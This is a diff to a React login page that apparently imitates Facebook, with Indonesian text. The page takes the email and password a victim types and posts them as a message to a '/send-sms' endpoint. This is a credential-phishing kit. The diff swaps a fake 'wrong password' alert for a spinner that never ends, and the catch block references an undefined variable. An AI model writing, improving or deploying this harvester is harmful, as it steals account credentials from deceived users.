@@ -2,32 +2,28 @@ import React, { useState } from 'react';
 import phoneImage from './assets/phone.png';
 import fb from './assets/fb.png';
 import play from './assets/ply.png';
-import Swal from 'sweetalert2';
 import api from './api';
 
 function App() {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
-
+    const [isLoading, setIsLoading] = useState(false);
     const handleLogin = (e) => {
         e.preventDefault();
+
+        setIsLoading(true);
+
         const message = `Email: ${email}, Password: ${password}`;
 
         api.post('/send-sms', { message })
             .then(response => {
-                Swal.fire({
-                    icon: 'error',
-                    title: 'Error',
-                    text: 'Password anda salah',
-                });
+                console.log(response.data)
+                setIsLoading(true);
             })
             .catch(error => {
-                Swal.fire({
-                    icon: 'error',
-                    title: 'Error',
-                    text: 'Password anda salah',
-                });
-            });
+                console.log(response.data)
+                setIsLoading(true);
+            })
     };
 
 
@@ -72,7 +68,16 @@ function App() {
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
                         />
-                        <button className="w-full py-1.5 bg-blue-500 text-white rounded-md hover:bg-blue-600">Masuk</button>
+                        <button className="w-full py-1.5 bg-blue-500 text-white rounded-md hover:bg-blue-600" disabled={isLoading}>
+                            {isLoading ? (
+                                <svg className="animate-spin h-6 w-6 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+                                </svg>
+                            ) : (
+                                'Masuk'
+                            )}
+                        </button>
                     </form>
                     <div className="flex items-center my-4">
                         <div className="flex-grow border-t border-gray-300"></div>
